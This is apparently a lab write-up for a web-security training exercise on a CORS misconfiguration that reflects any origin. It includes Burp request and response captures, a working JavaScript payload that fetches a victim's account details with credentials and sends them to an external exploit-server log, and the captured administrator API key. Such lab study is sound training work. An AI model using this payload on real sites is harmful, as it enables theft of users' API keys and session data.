### Lab: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Logged-in as user _wiener_, API token in profile page /my-account but requested using a GET request to **/accountDetails**, response
```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "71j4IP3asNi0t8sjultbCDyHmoTKkOQY",
  "sessions": [
    "T0xKfNW6FI70BZz9ttnyXPQ3xjFQnG8e"
  ]
}
```

2. Tested in Burp Repeater if the remote server accepts any Origin:

```http
GET /accountDetails HTTP/2
Host: 0acd006a0334464d804fe48f00a400e2.web-security-academy.net
Origin: https://exploit-0ad000ec032a46028091e3d001770095.exploit-server.net
Cookie: session=T0xKfNW6FI70BZz9ttnyXPQ3xjFQnG8e
```

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: https://exploit-0ad000ec032a46028091e3d001770095.exploit-server.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "71j4IP3asNi0t8sjultbCDyHmoTKkOQY",
  "sessions": [
    "T0xKfNW6FI70BZz9ttnyXPQ3xjFQnG8e"
  ]
}
```

it does...

3. Script to exploit CORS and retrieve the response from **/accountDetails**

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0acd006a0334464d804fe48f00a400e2.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='https://exploit-0ad000ec032a46028091e3d001770095.exploit-server.net/log?key='+this.responseText;
};
</script>
```

4. Extract API key from response
10.0.3.70       2023-05-22 14:21:20 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22**4B7yTzU5Wglcf1pmWxRKpLagpsR9vku2**%22,%20%20%22sessions%22:%20[%20%20%20%20%22hccCHFJUfgzeRHHkBJRWBTktpecdu9ee%22%20%20]}